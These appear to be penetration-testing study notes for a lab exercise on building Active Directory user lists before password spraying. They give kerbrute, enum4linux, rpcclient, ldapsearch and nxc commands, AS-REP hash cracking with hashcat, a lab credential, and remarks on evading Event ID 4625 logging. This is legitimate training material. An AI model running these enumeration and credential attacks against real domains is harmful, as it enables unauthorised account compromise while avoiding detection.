# Section 10 — Building a User List for Spraying

---

## QUICK REFERENCE — Decision Tree

```
Have valid creds?
  YES → nxc smb DC_IP -u USER -p PASS --users   (fastest, shows badpwdcount)
  NO  → SMB NULL session available?
          YES → enum4linux -U DC_IP  OR  rpcclient enumdomusers  OR  nxc --users (no creds)
          NO  → LDAP anon bind available?
                  YES → ldapsearch / windapsearch
                  NO  → kerbrute userenum + jsmith.txt / LinkedIn
```

---

## Lab Results

```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -o valid_users.txt
# Result: 56 valid usernames from 48,705 tested in ~11 seconds

# Bonus: mmorgan auto-flagged as AS-REP roastable
# Hash dumped: $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:...
# Crack: hashcat -m 18200 mmorgan.hash /usr/share/wordlists/rockyou.txt
```
> `kerbrute userenum` tests each line of the wordlist against Kerberos to confirm which usernames are real. `-o` saves the confirmed list. Kerbrute also automatically flags AS-REP roastable accounts and dumps their hashes for you.

---

## Method 1 — SMB NULL Session (No Creds)

```bash
# enum4linux
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

# rpcclient
rpcclient -U "" -N 172.16.5.5
# then: enumdomusers

# nxc (no creds)
nxc smb 172.16.5.5 --users
```
> A NULL session connects to SMB without credentials. `enum4linux -U` lists users. The `cut` commands strip the brackets from the output to get a clean username list. `rpcclient enumdomusers` returns usernames and their relative identifiers (RIDs). `nxc --users` without credentials tries the same NULL session approach.

---

## Method 2 — LDAP Anonymous Bind (No Creds)

```bash
# ldapsearch
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "

# windapsearch
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
# -u "" = anonymous | -U = users only
```
> `ldapsearch` queries the DC's LDAP (Lightweight Directory Access Protocol) directly. The filter `(objectclass=user)` returns all user objects. `grep sAMAccountName` then `cut` extracts just the username. `windapsearch -u ""` is an anonymous bind; `-U` limits results to user accounts.

---

## Method 3 — Kerbrute (No Creds, Stealthy)

```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -o valid_users.txt
```
> Tests each username from the wordlist against Kerberos. Valid usernames get a different response than invalid ones. No credentials needed. Saves confirmed valid users to the output file.

**Why kerbrute enumeration is stealthy:** Uses Kerberos pre-auth — does NOT generate Event ID 4625. Only generates 4768 if Kerberos audit is enabled.

**Note:** Kerbrute **spraying** is NOT stealthy — failed attempts count toward lockout.

Wordlists:
```
/opt/jsmith.txt
~/SecLists/Usernames/xato-net-10-million-usernames.txt
```

---

## Method 4 — Credentialed (Best — Shows badpwdcount)

```bash
nxc smb 172.16.5.5 -u wley -p 'transporter@4' --users

# Filter out accounts near lockout threshold (threshold=5, skip 3+)
nxc smb 172.16.5.5 -u wley -p 'transporter@4' --users | grep -v "badpwdcount: [3-9]"
```
> `--users` returns all domain users along with their bad password count (`badpwdcount`). The second command filters out any account already at 3 or more failed attempts when your threshold is 5. This prevents you from accidentally locking accounts.

**`badpwdcount` is critical** — skip any account at 3+ when threshold is 5.

---

## Pre-Spray Logging Checklist

- [ ] Accounts targeted (user list file)
- [ ] DC used
- [ ] Time and date of each spray attempt
- [ ] Password(s) attempted

If lockout occurs → hand notes to client to cross-check their logs.

---

## Exam Notes

- `nxc --users` credentialed = fastest + shows badpwdcount — always use when you have creds
- Kerbrute enum = stealthy (no 4625), kerbrute spray = not stealthy
- AS-REP roastable accounts auto-flagged by Kerbrute during enum — grab that hash
- Check badpwdcount before spraying — skip accounts at 3+ if threshold is 5
- Log everything — time, date, accounts, passwords tried
